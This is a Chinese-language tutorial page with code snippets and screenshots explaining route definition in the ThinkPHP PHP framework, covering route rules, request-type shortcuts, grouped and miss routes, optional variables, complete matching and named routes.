<pre><code class="lang-php">Route::rule(<span class="hljs-string">&apos;sc/:name/:uid&apos;</span>, <span class="hljs-string">&apos;datatest/hello2&apos;</span>, <span class="hljs-string">&apos;POST|GET&apos;</span>)-&gt;pattern([<span class="hljs-string">&apos;id&apos;</span>=&gt;<span class="hljs-string">&apos;\d+&apos;</span>, <span class="hljs-string">&apos;uid&apos;</span>=&gt;<span class="hljs-string">&apos;\d+&apos;</span>]);
</code></pre>
<pre><code class="lang-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hello2</span><span class="hljs-params">($name, $uid)</span>
    </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&#x540D;&#x5B57;name&#x662F;: &quot;</span>.$name.<span class="hljs-string">&quot;uid&#x662F;: &quot;</span>.$uid;
    }
</code></pre>
<p><a href="https://imgse.com/i/ppi46eS" target="_blank"><img src="https://s1.ax1x.com/2023/03/01/ppi46eS.png" alt="ppi46eS.png"></a></p>
<p>.</p>
<pre><code class="lang-php">Route::pattern([<span class="hljs-string">&apos;id&apos;</span>=&gt;<span class="hljs-string">&apos;\d+&apos;</span>, <span class="hljs-string">&apos;uid&apos;</span>=&gt;<span class="hljs-string">&apos;\d+&apos;</span>]);
Route::rule(<span class="hljs-string">&apos;sc/:name/:uid&apos;</span>, <span class="hljs-string">&apos;datatest/hello2&apos;</span>);
</code></pre>
<p><a href="https://imgse.com/i/ppi4bo4" target="_blank"><img src="https://s1.ax1x.com/2023/03/01/ppi4bo4.png" alt="ppi4bo4.png"></a></p>
<p>.</p>
<pre><code class="lang-php">Route::rule(<span class="hljs-string">&apos;sc-:name-:uid&apos;</span>, <span class="hljs-string">&apos;datatest/hello2&apos;</span>, <span class="hljs-string">&apos;POST|GET&apos;</span>);
</code></pre>
<p><a href="https://imgse.com/i/ppi59eO" target="_blank"><img src="https://s1.ax1x.com/2023/03/01/ppi59eO.png" alt="ppi59eO.png"></a></p>
<pre><code class="lang-php">Route::rule(<span class="hljs-string">&apos;ids_:name&apos;</span>, <span class="hljs-string">&apos;datatest/hello&apos;</span>, <span class="hljs-string">&apos;POST|GET&apos;</span>);
</code></pre>
<p><a href="https://imgse.com/i/ppi5e6P" target="_blank"><img src="https://s1.ax1x.com/2023/03/01/ppi5e6P.png" alt="ppi5e6P.png"></a></p>
<p>.</p>
<pre><code class="lang-php">Route::rule(<span class="hljs-string">&apos;ids-&lt;name&gt;&apos;</span>, <span class="hljs-string">&apos;datatest/hello&apos;</span>, <span class="hljs-string">&apos;POST|GET&apos;</span>);
</code></pre>
<p><a href="https://imgse.com/i/ppi5MTg" target="_blank"><img src="https://s1.ax1x.com/2023/03/01/ppi5MTg.png" alt="ppi5MTg.png"></a></p>
<p>.</p>
<pre><code class="lang-php">Route::rule(<span class="hljs-string">&apos;ids-&lt;test&gt;-&lt;name&gt;&apos;</span>, <span class="hljs-string">&apos;data:test/hello&apos;</span>, <span class="hljs-string">&apos;POST|GET&apos;</span>);
</code></pre>
<p>&#x8FD9;&#x91CC;&#x7684;<test>&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x63A7;&#x5236;&#x5668;&#x540E;&#x534A;&#x90E8;&#x5206;&#x4E0D;&#x77E5;&#x9053;&#x7684;&#x901A;&#x8FC7;&#x65B9;&#x5F0F;&#x4F20;&#x5165;</test></p>
<p><a href="https://imgse.com/i/ppi50k4" target="_blank"><img src="https://s1.ax1x.com/2023/03/01/ppi50k4.png" alt="ppi50k4.png"></a></p>
<p>&#x9759;&#x6001;&#x65B9;&#x6CD5;&#x548C;&#x52A8;&#x6001;&#x65B9;&#x6CD5;&#x90FD;&#x53EF;&#x4EE5;</p>
<pre><code class="lang-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hello</span><span class="hljs-params">($name)</span>
    </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-string">&apos;123: &apos;</span>. $name;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hello</span><span class="hljs-params">($name)</span>
    </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-string">&apos;123: &apos;</span>. $name;
    }
</code></pre>
<p>&#x5B8C;&#x6574;&#x5F62;&#x5F0F;&#x548C;&#x7F29;&#x5199;&#x5F62;&#x5F0F;</p>
<pre><code class="lang-php"><span class="hljs-comment">//&#x7F29;&#x5199;</span>
Route::get(<span class="hljs-string">&apos;hello/:name&apos;</span>, <span class="hljs-string">&apos;index/hello&apos;</span>);
<span class="hljs-comment">//&#x5B8C;&#x6574;&#x5F62;&#x5F0F;</span>
</code></pre>
<p><a href="https://imgse.com/i/ppFlKzT" target="_blank"><img src="https://s1.ax1x.com/2023/03/02/ppFlKzT.png" alt="ppFlKzT.png"></a></p>
<pre><code class="lang-php">http:<span class="hljs-comment">//localhost:8000/hello/123</span>
</code></pre>
<p><a href="https://imgse.com/i/ppFlmiq" target="_blank"><img src="https://s1.ax1x.com/2023/03/02/ppFlmiq.png" alt="ppFlmiq.png"></a></p>
<p>&#x6216;&#x8005;</p>
<pre><code class="lang-php">Route::get(<span class="hljs-string">&apos;hello/:name&apos;</span>, <span class="hljs-string">&apos;app\controller\index@hello&apos;</span>);
</code></pre>
<p><a href="https://imgse.com/i/ppFl8eJ" target="_blank"><img src="https://s1.ax1x.com/2023/03/02/ppFl8eJ.png" alt="ppFl8eJ.png"></a></p>
<p>&#x91CD;&#x5B9A;&#x5411;</p>
<pre><code class="lang-json">Route::get(<span class="hljs-string">&apos;hello/:name&apos;</span>, <span class="hljs-string">&apos;http://localhost:8000/hello/123&apos;</span>);
</code></pre>
<p>&#x540E;&#x7F00;&#x68C0;&#x6D4B;</p>
<pre><code class="lang-php">Route::get(<span class="hljs-string">&apos;hello/:name&apos;</span>, <span class="hljs-string">&apos;app/controller/index/hello&apos;</span>)-&gt;ext(<span class="hljs-string">&apos;ht&apos;</span>);
</code></pre>
<p><a href="https://imgse.com/i/ppFlUW6" target="_blank"><img src="https://s1.ax1x.com/2023/03/02/ppFlUW6.png" alt="ppFlUW6.png"></a></p>
<p>&#x5206;&#x7EC4;&#x8DEF;&#x7531;</p>
<pre><code class="lang-php">Route::group(<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span></span>{
    Route::rule(<span class="hljs-string">&apos;sc-:name&apos;</span>, <span class="hljs-string">&apos;datatest/hello&apos;</span>, <span class="hljs-string">&apos;POST|GET&apos;</span>);
    Route::rule(<span class="hljs-string">&apos;dc-:name-:uid&apos;</span>, <span class="hljs-string">&apos;datatest/hello2&apos;</span>, <span class="hljs-string">&apos;POST|GET&apos;</span>);

});
</code></pre>
<p><a href="https://imgse.com/i/ppF3e2V" target="_blank"><img src="https://s1.ax1x.com/2023/03/02/ppF3Z80.png" alt="ppF3Z80.png">[<img src="https://s1.ax1x.com/2023/03/02/ppF3e2V.png" alt="ppF3e2V.png"></a></p>
<p>&#x5168;&#x5C40;Miss&#x8DEF;&#x7531;</p>
<pre><code class="lang-php">Route::miss(<span class="hljs-string">&apos;public/miss&apos;</span>);
</code></pre>
<p><a href="https://imgse.com/i/ppF8SiR" target="_blank"><img src="https://s1.ax1x.com/2023/03/02/ppF8SiR.png" alt="ppF8SiR.png"></a></p>
<p><a href="https://imgse.com/i/ppF3xo9" target="_blank"><img src="https://s1.ax1x.com/2023/03/02/ppF3xo9.png" alt="ppF3xo9.png"></a></p>
<p><a href="https://imgse.com/i/ppF89Rx" target="_blank"><img src="https://s1.ax1x.com/2023/03/02/ppF89Rx.png" alt="ppF89Rx.png"></a></p>
<p>&#x5206;&#x7EC4;miss&#x8DEF;&#x7531;</p>
<pre><code class="lang-php">Route::group(<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span></span>{
    Route::rule(<span class="hljs-string">&apos;sc-:name&apos;</span>, <span class="hljs-string">&apos;datatest/hello&apos;</span>, <span class="hljs-string">&apos;POST|GET&apos;</span>);
    Route::rule(<span class="hljs-string">&apos;dc-:name-:uid&apos;</span>, <span class="hljs-string">&apos;datatest/hello2&apos;</span>, <span class="hljs-string">&apos;POST|GET&apos;</span>);
    Route::miss(<span class="hljs-string">&apos;miss&apos;</span>);

});
</code></pre>
<p><a href="https://imgse.com/i/ppF8FsO" target="_blank"><img src="https://s1.ax1x.com/2023/03/02/ppF8FsO.png" alt="ppF8FsO.png"></a></p>
<p>&#x5E76;&#x4E14;&#x539F;&#x6765;&#x7684;&#x8BBF;&#x95EE;&#x5730;&#x5740;&#x4F1A;&#x81EA;&#x52A8;&#x5931;&#x6548;&#x3002;</p>
<p>&#x53EF;&#x4EE5;&#x5728;<code>rule</code>&#x65B9;&#x6CD5;&#x4E2D;&#x6307;&#x5B9A;&#x8BF7;&#x6C42;&#x7C7B;&#x578B;&#xFF08;&#x4E0D;&#x6307;&#x5B9A;&#x7684;&#x8BDD;&#x9ED8;&#x8BA4;&#x4E3A;&#x4EFB;&#x4F55;&#x8BF7;&#x6C42;&#x7C7B;&#x578B;&#x6709;&#x6548;&#xFF09;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Route::rule(&apos;new/:id&apos;, &apos;News/update&apos;, &apos;POST&apos;);
</code></pre><blockquote>
<p>&#x8BF7;&#x6C42;&#x7C7B;&#x578B;&#x53C2;&#x6570;&#x4E0D;&#x533A;&#x5206;&#x5927;&#x5C0F;&#x5199;&#x3002;</p>
</blockquote>
<p>&#x8868;&#x793A;&#x5B9A;&#x4E49;&#x7684;&#x8DEF;&#x7531;&#x89C4;&#x5219;&#x5728;<code>POST</code>&#x8BF7;&#x6C42;&#x4E0B;&#x624D;&#x6709;&#x6548;&#x3002;&#x5982;&#x679C;&#x8981;&#x5B9A;&#x4E49;<code>GET</code>&#x548C;<code>POST</code>&#x8BF7;&#x6C42;&#x652F;&#x6301;&#x7684;&#x8DEF;&#x7531;&#x89C4;&#x5219;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#xFF1A;</p>
<pre><code>Route::rule(&apos;new/:id&apos;,&apos;News/read&apos;,&apos;GET|POST&apos;);
</code></pre><p>&#x4E0D;&#x8FC7;&#x901A;&#x5E38;&#x6211;&#x4EEC;&#x66F4;&#x63A8;&#x8350;&#x4F7F;&#x7528;&#x5BF9;&#x5E94;&#x8BF7;&#x6C42;&#x7C7B;&#x578B;&#x7684;&#x5FEB;&#x6377;&#x65B9;&#x6CD5;&#xFF0C;&#x5305;&#x62EC;&#xFF1A;</p>
<table>
<thead>
<tr>
<th style="text-align:left">&#x7C7B;&#x578B;</th>
<th style="text-align:left">&#x63CF;&#x8FF0;</th>
<th style="text-align:left">&#x5FEB;&#x6377;&#x65B9;&#x6CD5;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">GET</td>
<td style="text-align:left">GET&#x8BF7;&#x6C42;</td>
<td style="text-align:left">get</td>
</tr>
<tr>
<td style="text-align:left">POST</td>
<td style="text-align:left">POST&#x8BF7;&#x6C42;</td>
<td style="text-align:left">post</td>
</tr>
<tr>
<td style="text-align:left">PUT</td>
<td style="text-align:left">PUT&#x8BF7;&#x6C42;</td>
<td style="text-align:left">put</td>
</tr>
<tr>
<td style="text-align:left">DELETE</td>
<td style="text-align:left">DELETE&#x8BF7;&#x6C42;</td>
<td style="text-align:left">delete</td>
</tr>
<tr>
<td style="text-align:left">PATCH</td>
<td style="text-align:left">PATCH&#x8BF7;&#x6C42;</td>
<td style="text-align:left">patch</td>
</tr>
<tr>
<td style="text-align:left">HEAD</td>
<td style="text-align:left">HEAD&#x8BF7;&#x6C42;</td>
<td style="text-align:left">head &#xFF08;<code>V6.0.13+</code>&#xFF09;</td>
</tr>
<tr>
<td style="text-align:left">*</td>
<td style="text-align:left">&#x4EFB;&#x4F55;&#x8BF7;&#x6C42;&#x7C7B;&#x578B;</td>
<td style="text-align:left">any</td>
</tr>
</tbody>
</table>
<p>&#x5FEB;&#x6377;&#x6CE8;&#x518C;&#x65B9;&#x6CD5;&#x7684;&#x7528;&#x6CD5;&#x4E3A;&#xFF1A;</p>
<blockquote>
<p>Route::&#x5FEB;&#x6377;&#x65B9;&#x6CD5;&#x540D;(&apos;&#x8DEF;&#x7531;&#x8868;&#x8FBE;&#x5F0F;&apos;, &apos;&#x8DEF;&#x7531;&#x5730;&#x5740;&apos;);</p>
</blockquote>
<p>&#x4F7F;&#x7528;&#x793A;&#x4F8B;&#x5982;&#x4E0B;&#xFF1A;</p>
<pre><code>Route::get(&apos;new/&lt;id&gt;&apos;,&apos;News/read&apos;); // &#x5B9A;&#x4E49;GET&#x8BF7;&#x6C42;&#x8DEF;&#x7531;&#x89C4;&#x5219;
Route::post(&apos;new/&lt;id&gt;&apos;,&apos;News/update&apos;); // &#x5B9A;&#x4E49;POST&#x8BF7;&#x6C42;&#x8DEF;&#x7531;&#x89C4;&#x5219;
Route::put(&apos;new/:id&apos;,&apos;News/update&apos;); // &#x5B9A;&#x4E49;PUT&#x8BF7;&#x6C42;&#x8DEF;&#x7531;&#x89C4;&#x5219;
Route::delete(&apos;new/:id&apos;,&apos;News/delete&apos;); // &#x5B9A;&#x4E49;DELETE&#x8BF7;&#x6C42;&#x8DEF;&#x7531;&#x89C4;&#x5219;
Route::any(&apos;new/:id&apos;,&apos;News/read&apos;); // &#x6240;&#x6709;&#x8BF7;&#x6C42;&#x90FD;&#x652F;&#x6301;&#x7684;&#x8DEF;&#x7531;&#x89C4;&#x5219;
</code></pre><p>&#x6CE8;&#x518C;&#x591A;&#x4E2A;&#x8DEF;&#x7531;&#x89C4;&#x5219;&#x540E;&#xFF0C;&#x7CFB;&#x7EDF;&#x4F1A;&#x4F9D;&#x6B21;&#x904D;&#x5386;&#x6CE8;&#x518C;&#x8FC7;&#x7684;&#x6EE1;&#x8DB3;&#x8BF7;&#x6C42;&#x7C7B;&#x578B;&#x7684;&#x8DEF;&#x7531;&#x89C4;&#x5219;&#xFF0C;&#x4E00;&#x65E6;&#x5339;&#x914D;&#x5230;&#x6B63;&#x786E;&#x7684;&#x8DEF;&#x7531;&#x89C4;&#x5219;&#x540E;&#x5219;&#x5F00;&#x59CB;&#x6267;&#x884C;&#x6700;&#x7EC8;&#x7684;&#x8C03;&#x5EA6;&#x65B9;&#x6CD5;&#xFF0C;&#x540E;&#x7EED;&#x89C4;&#x5219;&#x5C31;&#x4E0D;&#x518D;&#x68C0;&#x6D4B;&#x3002;</p>
<h5 id="&#x89C4;&#x5219;&#x8868;&#x8FBE;&#x5F0F;">&#x89C4;&#x5219;&#x8868;&#x8FBE;&#x5F0F;</h5>
<p>&#x89C4;&#x5219;&#x8868;&#x8FBE;&#x5F0F;&#x901A;&#x5E38;&#x5305;&#x542B;&#x9759;&#x6001;&#x89C4;&#x5219;&#x548C;&#x52A8;&#x6001;&#x89C4;&#x5219;&#xFF0C;&#x4EE5;&#x53CA;&#x4E24;&#x79CD;&#x89C4;&#x5219;&#x7684;&#x7ED3;&#x5408;&#xFF0C;&#x4F8B;&#x5982;&#x4E0B;&#x9762;&#x90FD;&#x5C5E;&#x4E8E;&#x6709;&#x6548;&#x7684;&#x89C4;&#x5219;&#x8868;&#x8FBE;&#x5F0F;&#xFF1A;</p>
<pre><code>Route::rule(&apos;/&apos;, &apos;index&apos;); // &#x9996;&#x9875;&#x8BBF;&#x95EE;&#x8DEF;&#x7531;
Route::rule(&apos;my&apos;, &apos;Member/myinfo&apos;); // &#x9759;&#x6001;&#x5730;&#x5740;&#x8DEF;&#x7531;
Route::rule(&apos;blog/:id&apos;, &apos;Blog/read&apos;); // &#x9759;&#x6001;&#x5730;&#x5740;&#x548C;&#x52A8;&#x6001;&#x5730;&#x5740;&#x7ED3;&#x5408;
Route::rule(&apos;new/:year/:month/:day&apos;, &apos;News/read&apos;); // &#x9759;&#x6001;&#x5730;&#x5740;&#x548C;&#x52A8;&#x6001;&#x5730;&#x5740;&#x7ED3;&#x5408;
Route::rule(&apos;:user/:blog_id&apos;, &apos;Blog/read&apos;); // &#x5168;&#x52A8;&#x6001;&#x5730;&#x5740;
</code></pre><blockquote>
<p>&#x89C4;&#x5219;&#x8868;&#x8FBE;&#x5F0F;&#x7684;&#x5B9A;&#x4E49;&#x4EE5;<code>/</code>&#x4E3A;&#x53C2;&#x6570;&#x5206;&#x5272;&#x7B26;&#xFF08;&#x65E0;&#x8BBA;&#x4F60;&#x7684;<code>PATH_INFO</code>&#x5206;&#x9694;&#x7B26;&#x8BBE;&#x7F6E;&#x662F;&#x4EC0;&#x4E48;&#xFF0C;&#x8BF7;&#x786E;&#x4FDD;&#x5728;&#x5B9A;&#x4E49;&#x8DEF;&#x7531;&#x89C4;&#x5219;&#x8868;&#x8FBE;&#x5F0F;&#x7684;&#x65F6;&#x5019;&#x7EDF;&#x4E00;&#x4F7F;&#x7528;<code>/</code>&#x8FDB;&#x884C;URL&#x53C2;&#x6570;&#x5206;&#x5272;&#xFF0C;&#x9664;&#x975E;&#x662F;&#x4F7F;&#x7528;&#x7EC4;&#x5408;&#x53D8;&#x91CF;&#x7684;&#x60C5;&#x51B5;&#xFF09;&#x3002;</p>
</blockquote>
<p>&#x4FEE;&#x6539;&#x9996;&#x9875;</p>
<pre><code>Route::rule(&apos;/&apos;,&apos;test/index&apos;);
</code></pre><p><img src="https://s3.bmp.ovh/imgs/2023/01/28/1b94a43997e068cc.png" alt=""><img src="https://s3.bmp.ovh/imgs/2023/01/28/8fe288b39f4d31e0.png" alt=""><img src="https://s3.bmp.ovh/imgs/2023/01/28/23469eaa618f1c43.png" alt=""></p>
<p>&#x6BCF;&#x4E2A;&#x53C2;&#x6570;&#x4E2D;&#x53EF;&#x4EE5;&#x5305;&#x62EC;&#x52A8;&#x6001;&#x53D8;&#x91CF;&#xFF0C;&#x4F8B;&#x5982;<code>:&#x53D8;&#x91CF;</code>&#x6216;&#x8005;<code>&lt;&#x53D8;&#x91CF;&gt;</code>&#x90FD;&#x8868;&#x793A;&#x52A8;&#x6001;&#x53D8;&#x91CF;&#xFF08;&#x65B0;&#x7248;&#x63A8;&#x8350;&#x4F7F;&#x7528;&#x7B2C;&#x4E8C;&#x79CD;&#x65B9;&#x5F0F;&#xFF0C;&#x66F4;&#x5229;&#x4E8E;&#x6DF7;&#x5408;&#x53D8;&#x91CF;&#x5B9A;&#x4E49;&#xFF09;&#xFF0C;&#x5E76;&#x4E14;&#x4F1A;&#x81EA;&#x52A8;&#x7ED1;&#x5B9A;&#x5230;&#x64CD;&#x4F5C;&#x65B9;&#x6CD5;&#x7684;&#x5BF9;&#x5E94;&#x53C2;&#x6570;&#x3002;</p>
<blockquote>
<p>&#x4F60;&#x7684;URL&#x8BBF;&#x95EE;<code>PATH_INFO</code>&#x5206;&#x9694;&#x7B26;&#x4F7F;&#x7528;<code>pathinfo_depr</code>&#x914D;&#x7F6E;&#xFF0C;&#x4F46;&#x65E0;&#x8BBA;&#x5982;&#x4F55;&#x914D;&#x7F6E;&#xFF0C;&#x90FD;&#x4E0D;&#x5F71;&#x54CD;&#x8DEF;&#x7531;&#x7684;&#x89C4;&#x5219;&#x8868;&#x8FBE;&#x5F0F;&#x7684;&#x8DEF;&#x7531;&#x5206;&#x9694;&#x7B26;&#x5B9A;&#x4E49;&#x3002;</p>
</blockquote>
<pre><code>public function url()
{
    return url(&apos;Address/details&apos;,[&apos;id&apos;=&gt;5]);
}
</code></pre><p>&#x6CE8;&#x89E3;&#x51FD;&#x6570;</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/01/28/0dbd6cc1726ab3e7.png" alt=""><img src="https://s3.bmp.ovh/imgs/2023/01/28/06a19844a172e54e.png" alt=""><img src="https://s3.bmp.ovh/imgs/2023/01/28/88137c601e6bb2a1.png" alt=""><img src="https://s3.bmp.ovh/imgs/2023/01/28/7b6b1458745f58a8.png" alt=""></p>
<h5 id="&#x53EF;&#x9009;&#x53D8;&#x91CF;">&#x53EF;&#x9009;&#x53D8;&#x91CF;</h5>
<p>&#x652F;&#x6301;&#x5BF9;&#x8DEF;&#x7531;&#x53C2;&#x6570;&#x7684;&#x53EF;&#x9009;&#x5B9A;&#x4E49;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Route::get(&apos;blog/:year/[:month]&apos;,&apos;Blog/archive&apos;);
// &#x6216;&#x8005;
Route::get(&apos;blog/&lt;year&gt;/&lt;month?&gt;&apos;,&apos;Blog/archive&apos;);
</code></pre><p>&#x53D8;&#x91CF;&#x7528;<code>[ ]</code>&#x5305;&#x542B;&#x8D77;&#x6765;&#x540E;&#x5C31;&#x8868;&#x793A;&#x8BE5;&#x53D8;&#x91CF;&#x662F;&#x8DEF;&#x7531;&#x5339;&#x914D;&#x7684;&#x53EF;&#x9009;&#x53D8;&#x91CF;&#x3002;</p>
<p>&#x4EE5;&#x4E0A;&#x5B9A;&#x4E49;&#x8DEF;&#x7531;&#x89C4;&#x5219;&#x540E;&#xFF0C;&#x4E0B;&#x9762;&#x7684;URL&#x8BBF;&#x95EE;&#x5730;&#x5740;&#x90FD;&#x53EF;&#x4EE5;&#x88AB;&#x6B63;&#x786E;&#x7684;&#x8DEF;&#x7531;&#x5339;&#x914D;&#xFF1A;</p>
<pre><code>http://serverName/index.php/blog/2015
http://serverName/index.php/blog/2015/12
</code></pre><p>&#x91C7;&#x7528;&#x53EF;&#x9009;&#x53D8;&#x91CF;&#x5B9A;&#x4E49;&#x540E;&#xFF0C;&#x4E4B;&#x524D;&#x9700;&#x8981;&#x5B9A;&#x4E49;&#x4E24;&#x4E2A;&#x6216;&#x8005;&#x591A;&#x4E2A;&#x8DEF;&#x7531;&#x89C4;&#x5219;&#x624D;&#x80FD;&#x5904;&#x7406;&#x7684;&#x60C5;&#x51B5;&#x53EF;&#x4EE5;&#x5408;&#x5E76;&#x4E3A;&#x4E00;&#x4E2A;&#x8DEF;&#x7531;&#x89C4;&#x5219;&#x3002;</p>
<blockquote>
<p>&#x53EF;&#x9009;&#x53C2;&#x6570;&#x53EA;&#x80FD;&#x653E;&#x5230;&#x8DEF;&#x7531;&#x89C4;&#x5219;&#x7684;&#x6700;&#x540E;&#xFF0C;&#x5982;&#x679C;&#x5728;&#x4E2D;&#x95F4;&#x4F7F;&#x7528;&#x4E86;&#x53EF;&#x9009;&#x53C2;&#x6570;&#x7684;&#x8BDD;&#xFF0C;&#x540E;&#x9762;&#x7684;&#x53D8;&#x91CF;&#x90FD;&#x4F1A;&#x53D8;&#x6210;&#x53EF;&#x9009;&#x53C2;&#x6570;&#x3002;</p>
</blockquote>
<h5 id="&#x5B8C;&#x5168;&#x5339;&#x914D;">&#x5B8C;&#x5168;&#x5339;&#x914D;</h5>
<p>&#x89C4;&#x5219;&#x5339;&#x914D;&#x68C0;&#x6D4B;&#x7684;&#x65F6;&#x5019;&#x9ED8;&#x8BA4;&#x53EA;&#x662F;&#x5BF9;URL&#x4ECE;&#x5934;&#x5F00;&#x59CB;&#x5339;&#x914D;&#xFF0C;&#x53EA;&#x8981;URL&#x5730;&#x5740;&#x5F00;&#x5934;&#x5305;&#x542B;&#x4E86;&#x5B9A;&#x4E49;&#x7684;&#x8DEF;&#x7531;&#x89C4;&#x5219;&#x5C31;&#x4F1A;&#x5339;&#x914D;&#x6210;&#x529F;&#xFF0C;&#x5982;&#x679C;&#x5E0C;&#x671B;URL&#x8FDB;&#x884C;&#x5B8C;&#x5168;&#x5339;&#x914D;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;&#x8DEF;&#x7531;&#x8868;&#x8FBE;&#x5F0F;&#x6700;&#x540E;&#x4F7F;&#x7528;<code>$</code>&#x7B26;&#x53F7;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Route::get(&apos;new/:cate$&apos;, &apos;News/category&apos;);
</code></pre><p>&#x8FD9;&#x6837;&#x5B9A;&#x4E49;&#x540E;</p>
<pre><code>http://serverName/index.php/new/info
</code></pre><p>&#x4F1A;&#x5339;&#x914D;&#x6210;&#x529F;,&#x800C;</p>
<pre><code>http://serverName/index.php/new/info/2
</code></pre><p>&#x5219;&#x4E0D;&#x4F1A;&#x5339;&#x914D;&#x6210;&#x529F;&#x3002;</p>
<p>&#x5982;&#x679C;&#x662F;&#x91C7;&#x7528;</p>
<pre><code>Route::get(&apos;new/:cate&apos;, &apos;News/category&apos;);
</code></pre><p>&#x65B9;&#x5F0F;&#x5B9A;&#x4E49;&#x7684;&#x8BDD;&#xFF0C;&#x5219;&#x4E24;&#x79CD;&#x65B9;&#x5F0F;&#x7684;URL&#x8BBF;&#x95EE;&#x90FD;&#x53EF;&#x4EE5;&#x5339;&#x914D;&#x6210;&#x529F;&#x3002;</p>
<p>&#x5982;&#x679C;&#x9700;&#x8981;&#x5168;&#x5C40;&#x8FDB;&#x884C;URL&#x5B8C;&#x5168;&#x5339;&#x914D;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;&#x8DEF;&#x7531;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x8BBE;&#x7F6E;</p>
<pre><code>// &#x5F00;&#x542F;&#x8DEF;&#x7531;&#x5B8C;&#x5168;&#x5339;&#x914D;
&apos;route_complete_match&apos;   =&gt; true,
</code></pre><p>&#x5F00;&#x542F;&#x5168;&#x5C40;&#x5B8C;&#x5168;&#x5339;&#x914D;&#x540E;&#xFF0C;&#x5982;&#x679C;&#x9700;&#x8981;&#x5BF9;&#x67D0;&#x4E2A;&#x8DEF;&#x7531;&#x5173;&#x95ED;&#x5B8C;&#x5168;&#x5339;&#x914D;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;</p>
<pre><code>Route::get(&apos;new/:cate&apos;, &apos;News/category&apos;)-&gt;completeMatch(false);
</code></pre><h5 id="&#x989D;&#x5916;&#x53C2;&#x6570;">&#x989D;&#x5916;&#x53C2;&#x6570;</h5>
<p>&#x5728;&#x8DEF;&#x7531;&#x8DF3;&#x8F6C;&#x7684;&#x65F6;&#x5019;&#x652F;&#x6301;&#x989D;&#x5916;&#x4F20;&#x5165;&#x53C2;&#x6570;&#x5BF9;&#xFF08;&#x989D;&#x5916;&#x53C2;&#x6570;&#x6307;&#x7684;&#x662F;&#x4E0D;&#x5728;URL&#x91CC;&#x9762;&#x7684;&#x53C2;&#x6570;&#xFF0C;&#x9690;&#x5F0F;&#x4F20;&#x5165;&#x9700;&#x8981;&#x7684;&#x64CD;&#x4F5C;&#x4E2D;&#xFF0C;&#x6709;&#x65F6;&#x5019;&#x80FD;&#x591F;&#x8D77;&#x5230;&#x4E00;&#x5B9A;&#x7684;&#x5B89;&#x5168;&#x9632;&#x62A4;&#x4F5C;&#x7528;&#xFF0C;&#x540E;&#x9762;&#x6211;&#x4EEC;&#x4F1A;&#x63D0;&#x5230;&#xFF09;&#x3002;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Route::get(&apos;blog/:id&apos;,&apos;blog/read&apos;)
    -&gt;append([&apos;status&apos; =&gt; 1, &apos;app_id&apos; =&gt;5]);
</code></pre><p>&#x4E0A;&#x9762;&#x7684;&#x8DEF;&#x7531;&#x89C4;&#x5219;&#x5B9A;&#x4E49;&#x4E2D;<code>status</code>&#x548C;<code>app_id</code>&#x53C2;&#x6570;&#x90FD;&#x662F;URL&#x91CC;&#x9762;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#xFF0C;&#x5C5E;&#x4E8E;&#x9690;&#x5F0F;&#x4F20;&#x503C;&#x3002;&#x53EF;&#x4EE5;&#x9488;&#x5BF9;&#x4E0D;&#x540C;&#x7684;&#x8DEF;&#x7531;&#x8BBE;&#x7F6E;&#x4E0D;&#x540C;&#x7684;&#x989D;&#x5916;&#x53C2;&#x6570;&#x3002;</p>
<blockquote>
<p>&#x5982;&#x679C;<code>append</code>&#x65B9;&#x6CD5;&#x4E2D;&#x7684;&#x53D8;&#x91CF;&#x548C;&#x8DEF;&#x7531;&#x89C4;&#x5219;&#x5B58;&#x5728;&#x51B2;&#x7A81;&#x7684;&#x8BDD;&#xFF0C;append&#x65B9;&#x6CD5;&#x4F20;&#x5165;&#x7684;&#x4F18;&#x5148;&#x3002;</p>
</blockquote>
<h5 id="&#x8DEF;&#x7531;&#x6807;&#x8BC6;">&#x8DEF;&#x7531;&#x6807;&#x8BC6;</h5>
<p>&#x5982;&#x679C;&#x4F60;&#x9700;&#x8981;&#x5FEB;&#x901F;&#x7684;&#x6839;&#x636E;&#x8DEF;&#x7531;&#x751F;&#x6210;URL&#x5730;&#x5740;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;&#x5B9A;&#x4E49;&#x8DEF;&#x7531;&#x7684;&#x65F6;&#x5019;&#x6307;&#x5B9A;&#x751F;&#x6210;&#x6807;&#x8BC6;&#xFF08;&#x4F46;&#x8981;&#x786E;&#x4FDD;&#x552F;&#x4E00;&#xFF09;&#x3002;</p>
<p>&#x4F8B;&#x5982;</p>
<pre><code>// &#x6CE8;&#x518C;&#x8DEF;&#x7531;&#x5230;News&#x63A7;&#x5236;&#x5668;&#x7684;read&#x64CD;&#x4F5C;
Route::rule(&apos;new/:id&apos;,&apos;News/read&apos;)
    -&gt;name(&apos;new_read&apos;);
</code></pre><p>&#x751F;&#x6210;&#x8DEF;&#x7531;&#x5730;&#x5740;&#x7684;&#x65F6;&#x5019;&#x5C31;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;</p>
<pre><code>url(&apos;new_read&apos;, [&apos;id&apos; =&gt; 10]);
